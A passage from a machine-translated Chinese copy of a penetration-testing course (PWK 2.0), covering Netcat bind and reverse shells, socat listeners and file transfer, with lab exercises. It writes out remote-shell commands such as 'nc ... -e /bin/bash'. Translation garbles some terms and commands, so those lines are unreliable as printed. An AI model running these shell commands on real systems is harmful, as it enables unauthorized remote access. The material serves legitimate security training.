<div style="position:absolute;top:93086;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 地址。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.22</font></font></nobr></div>
<div style="position:absolute;top:93103;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">子网掩码 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 255.255.0.0</font></font></nobr></div>
<div style="position:absolute;top:93120;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认网关 。</font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">: 10.11.0.1</font></font></nobr></div>
<div style="position:absolute;top:93140;left:327"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 87 - 使用 nc 连接到绑定 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们所看到的，这和预期的一样工作。</font><font style="vertical-align: inherit;">下图描述了这种情况：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93584;left:359"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 8：Netcat 绑定 shell 场景</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:93615;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.4.2 反壳场景</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:93650;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们的第二个场景中，Alice 需要 Bob 的帮助。</font><font style="vertical-align: inherit;">但是，Alice 无法控制路由器</font></font></nobr></div>
<div style="position:absolute;top:93669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">她的办公室，因此无法将流量从路由器转发到她的内部机器。</font></font></nobr></div>
<div style="position:absolute;top:93702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们可以利用 Netcat 的另一个有用功能；</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">的能力</font></font></nobr></div>
<div style="position:absolute;top:93721;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell 到侦听特定端口的主机。</font><font style="vertical-align: inherit;">在这种情况下，虽然 Alice 无法将端口绑定到</font></font></nobr></div>
<div style="position:absolute;top:93741;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/bin/bash 本地在她的计算机上并希望 Bob 连接，她</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">发送对她的控制</font></font></nobr></div>
<div style="position:absolute;top:93760;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令提示符改为鲍勃的机器。</font><font style="vertical-align: inherit;">这称为</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反向外壳</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">为了让这个工作，</font></font></nobr></div>
<div style="position:absolute;top:93779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bob 将首先设置 Netcat 以侦听传入的 shell。</font><font style="vertical-align: inherit;">我们将在示例中使用端口 4444：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:93814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:93831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:93850;left:250"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 88 - 使用 nc 设置侦听器以接收反向 shell </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:94027;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="80"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 80 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:94060;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:95137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:95137;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:95137;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在，Alice 可以从她的 Linux 机器向 Bob 发送一个反向 shell。</font><font style="vertical-align: inherit;">再一次，我们使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b></nobr></div>
<div style="position:absolute;top:94175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使应用程序远程可用的选项，在这种情况下恰好是 /bin/bash，</font></font></nobr></div>
<div style="position:absolute;top:94195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux外壳：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip 地址显示 eth0 | </font><font style="vertical-align: inherit;">网路</font></font></font></b></nobr></div>
<div style="position:absolute;top:94246;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet 10.11.0.4/16 brd 10.11.255.255 范围全局动态 eth0</font></font></nobr></div>
<div style="position:absolute;top:94280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.0.22 4444 -e /bin/bash</font></font></font></b></nobr></div>
<div style="position:absolute;top:94297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.0.22] 4444 (?) 打开</font></font></nobr></div>
<div style="position:absolute;top:94317;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 89 - 使用 nc 发送一个反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94346;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦建立连接，Alice 的 Netcat 将重定向 /bin/bash 输入、输出和</font></font></nobr></div>
<div style="position:absolute;top:94365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误数据在端口 4444 上传输到 Bob 的机器，并且 Bob 可以与该 shell 交互：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\用户\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nlvp 4444</font></font></font></b></nobr></div>
<div style="position:absolute;top:94417;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听[任何] 4444 ...</font></font></nobr></div>
<div style="position:absolute;top:94434;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 &lt;UNKNOWN 连接到 [10.11.0.22]) [10.11.0.4] 43482</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:94468;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ip 地址显示 eth0 | </font><font style="vertical-align: inherit;">网路</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:94485;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inet 10.11.0.4/16 brd 10.11.255.255 范围全局动态 eth0</font></font></nobr></div>
<div style="position:absolute;top:94504;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 90 - 使用 nc 接收反向 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:94534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花一些时间考虑绑定和反向 shell 之间的差异，以及它们如何</font></font></nobr></div>
<div style="position:absolute;top:94553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从组织安全的角度来看，差异可能适用于各种防火墙配置。</font></font></nobr></div>
<div style="position:absolute;top:94572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重要的是要认识到传出流量与传入流量一样有害。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:94592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下图描述了 Bob 获得 Alice 的远程 shell 访问权限的反向 shell 场景</font></font></nobr></div>
<div style="position:absolute;top:94611;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Linux机器，穿越企业防火墙： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:95215;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="81"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 81 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:95248;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:96325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:96325;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:96325;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">81</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:95726;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 9：Netcat 反向 shell 场景</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95785;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基于主机的防火墙阻止访问我们宝贵的绑定的情况并不少见</font></font></i></nobr></div>
<div style="position:absolute;top:95804;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">贝壳。</font><font style="vertical-align: inherit;">这有时会令人难以置信地令人沮丧，尤其是在压力之下</font></font></i></nobr></div>
<div style="position:absolute;top:95823;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和处理时间限制。</font><font style="vertical-align: inherit;">如有疑问，我们使用反向 shell，因为它们</font></font></i></nobr></div>
<div style="position:absolute;top:95843;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常更容易排除故障。</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:95905;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.1.4.3 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:95940;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
<div style="position:absolute;top:95972;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.在你的Kali机器和Windows系统之间实现一个简单的聊天。</font></font></nobr></div>
<div style="position:absolute;top:96001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用Netcat创建一个：</font></font></nobr></div>
<div style="position:absolute;top:96029;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一种。</font><font style="vertical-align: inherit;">从 Kali 到 Windows 的反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:96057;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">湾 </font><font style="vertical-align: inherit;">从 Windows 到 Kali 的反向 shell。</font></font></nobr></div>
<div style="position:absolute;top:96086;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C。</font><font style="vertical-align: inherit;">在 Kali 上绑定 shell。</font><font style="vertical-align: inherit;">使用您的 Windows 系统连接到它。</font></font></nobr></div>
<div style="position:absolute;top:96114;left:163"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">d. </font><font style="vertical-align: inherit;">在 Windows 上绑定 shell。</font><font style="vertical-align: inherit;">使用您的 Kali 机器连接到它。</font></font></nobr></div>
<div style="position:absolute;top:96142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 将文件从 Kali 机器传输到 Windows，反之亦然。</font></font></nobr></div>
<div style="position:absolute;top:96171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 在 Windows 系统上启用防火墙的情况下再次进行练习。</font><font style="vertical-align: inherit;">适应</font></font></nobr></div>
<div style="position:absolute;top:96190;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据需要进行练习以解决防火墙保护并了解哪些部分</font></font></nobr></div>
<div style="position:absolute;top:96210;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的练习无法再成功完成。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:96403;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="82"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 82 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:96436;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:97513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:97513;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:97513;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">82</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:96532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2 索卡特</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96573;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socat </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">84</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个命令行实用程序，可建立两个双向字节流并传输数据</font></font></nobr></div>
<div style="position:absolute;top:96593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它们之间。</font><font style="vertical-align: inherit;">对于渗透测试，它类似于 Netcat，但具有额外的有用功能。</font></font></nobr></div>
<div style="position:absolute;top:96625;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 socat 可以做很多事情，但我们只会介绍其中的一些来说明</font></font></nobr></div>
<div style="position:absolute;top:96645;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它的用途。</font><font style="vertical-align: inherit;">让我们开始探索 socat，看看它与 Netcat 的比较。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:96679;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.1 Netcat vs Socat</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96718;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们使用 Netcat 和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">连接到端口 80 上的远程服务器</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc &lt;远程服务器的IP地址&gt; 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:96786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat - TCP4:&lt;远程服务器的IP地址&gt;:80</font></font></font></b></nobr></div>
<div style="position:absolute;top:96806;left:171"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 91 - 使用 socat 连接到端口 80 上的远程服务器，并将其语法与 nc 的语法进行比较</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:96835;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，语法类似，但 socat 需要 - 在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDIO</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:96854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程主机（允许我们的键盘与 shell 交互）和协议（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）。</font><font style="vertical-align: inherit;">该协议，</font></font></nobr></div>
<div style="position:absolute;top:96874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项和端口号以冒号分隔。</font></font></nobr></div>
<div style="position:absolute;top:96907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因为将监听器绑定到1024以下的端口需要root权限，所以我们需要使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo</font></font></font></b></nobr></div>
<div style="position:absolute;top:96926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在端口 443 上启动侦听器时：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:96961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nc -lvp localhost 443</font></font></font></b></nobr></div>
<div style="position:absolute;top:96995;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo socat TCP4-LISTEN:443 STDOUT</font></font></font></b></nobr></div>
<div style="position:absolute;top:97014;left:234"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 92 - 使用 socat 创建侦听器，并将其语法与 nc 的语法进行比较</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意需要添加侦听器 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP4-LISTEN</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STDOUT 的协议</font></font></i></nobr></div>
<div style="position:absolute;top:97063;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参数，它重定向标准输出。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:97097;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4.2.2 Socat 文件传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们将尝试文件传输。</font><font style="vertical-align: inherit;">继续之前的爱丽丝和鲍勃的虚构角色，</font></font></nobr></div>
<div style="position:absolute;top:97155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">假设 Alice 需要向 Bob 发送一个名为 secret_passwords.txt 的文件。</font><font style="vertical-align: inherit;">提醒一下，爱丽丝的主人</font></font></nobr></div>
<div style="position:absolute;top:97174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器在 Linux 上运行，而 Bob 的机器在 Windows 上运行。</font><font style="vertical-align: inherit;">让我们看看它的实际效果。</font></font></nobr></div>
<div style="position:absolute;top:97207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Alice 一侧，我们将在端口 443 上共享文件。在此示例中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP4-LISTEN</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定</font></font></nobr></div>
<div style="position:absolute;top:97226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IPv4 侦听器，</font><font style="vertical-align: inherit;">一旦与侦听器建立连接</font><font style="vertical-align: inherit;">，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">fork</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">就会创建一个子进程，这</font></font></nobr></div>
<div style="position:absolute;top:97246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许多个连接，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file：</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要传输的文件名：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo socat TCP4-LISTEN:443,fork 文件:secret_passwords.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:97300;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 93 - 使用 socat 传输文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Bob 一侧，我们将连接到 Alice 的计算机并检索文件。</font><font style="vertical-align: inherit;">在本例中，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP4</font></font></font></b></nobr></div>
<div style="position:absolute;top:97349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项指定 IPv4，后跟 Alice 的 IP 地址 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.4</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和侦听端口号 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">443</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )，</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:97369;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">file：</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定要在 Bob 的计算机上保存文件的本地文件名，并且</font></font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">create</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:97388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将创建一个新文件：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:97463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">84 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（dest-unreach，2019），http://www.dest-unreach.org/socat/doc/socat.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:97591;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="83"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 83 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:97624;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:98701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:98701;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:98701;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">83</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:97722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create</font></font></font></b></nobr></div>
<div style="position:absolute;top:97756;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\offsec&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入 received_secret_passwords.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:97773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“更加努力！！！”</font></font></nobr></div>
<div style="position:absolute;top:97792;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 94 - 使用 socat 接收文件</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
